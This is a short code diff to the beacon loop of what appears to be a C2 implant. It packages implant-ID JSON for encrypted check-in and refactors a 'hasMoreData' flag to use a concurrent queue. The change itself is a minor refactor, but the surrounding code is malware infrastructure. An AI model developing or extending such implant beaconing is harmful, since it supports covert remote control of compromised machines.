@@ -111,7 +111,7 @@ void Beacon::run() {
                 continue;
             }
         }
-
+        bool hasMoreData = false;
         try {
             nlohmann::json payload = {
                 {"id", implantId_},
@@ -142,7 +142,7 @@ void Beacon::run() {
             std::string payload_str = payload.dump();
             
             // If we have more data, we'll skip sleep later
-            bool hasMoreData = !pendingResults_.empty();
+            hasMoreData = pendingResults_.size_approx() > 0;
             std::vector<BYTE> plaintext(payload_str.begin(), payload_str.end());
 
             std::vector<BYTE> nonce(12);
